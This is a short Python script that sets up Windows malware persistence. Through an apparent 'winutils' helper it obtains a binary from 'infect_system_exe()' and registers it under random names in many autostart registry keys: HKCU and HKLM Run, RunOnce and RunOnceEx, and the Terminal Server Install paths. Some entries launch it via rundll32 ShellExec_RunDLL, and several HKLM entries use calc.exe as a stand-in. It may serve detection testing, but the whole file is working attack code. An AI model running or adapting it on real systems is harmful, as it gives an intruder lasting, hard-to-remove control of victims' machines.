import winutils

binary = winutils.infect_system_exe()

# HKCU Run
winutils.set_registry_value('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', winutils.random_name(), binary)

# HKCU RunOnce
winutils.set_registry_value('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce', winutils.random_name(), 'rundll32.exe shell32.dll,ShellExec_RunDLL {0}'.format(binary))

# HKCU RunOnceEx
winutils.set_registry_value('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx', 'Title', winutils.random_name())
winutils.set_registry_value('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx', 'Flags', 0x00000002)
winutils.set_registry_value('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001', 'RunMyApp', 'rundll32.exe shell32.dll,ShellExec_RunDLL {0}'.format(binary))

# Terminal Run
winutils.set_registry_value('HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', winutils.random_name(), binary)

# Terminal RunOnce
winutils.set_registry_value('HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce', winutils.random_name(), 'rundll32.exe shell32.dll,ShellExec_RunDLL {0}'.format(binary))

# Terminal RunOnceEx
winutils.set_registry_value('HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx', 'Title', winutils.random_name())
winutils.set_registry_value('HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx', 'Flags', 0x00000002)
winutils.set_registry_value('HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx', 'RunMyApp', 'rundll32.exe shell32.dll,ShellExec_RunDLL {0}'.format(binary))

# HKLM Run
winutils.set_registry_value('HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'Test', binary)

# HKLM RunOnce
winutils.set_registry_value('HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce', 'Test', 'C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,ShellExec_RunDLL C:\\Windows\\System32\\calc.exe')

# HKLM RunOnceEx
winutils.set_registry_value('HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx', 'Title', winutils.random_name())
winutils.set_registry_value('HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx', 'Flags', 0x00000002)
winutils.set_registry_value('HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001', 'RunMyApp', 'C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,ShellExec_RunDLL C:\\Windows\\System32\\calc.exe')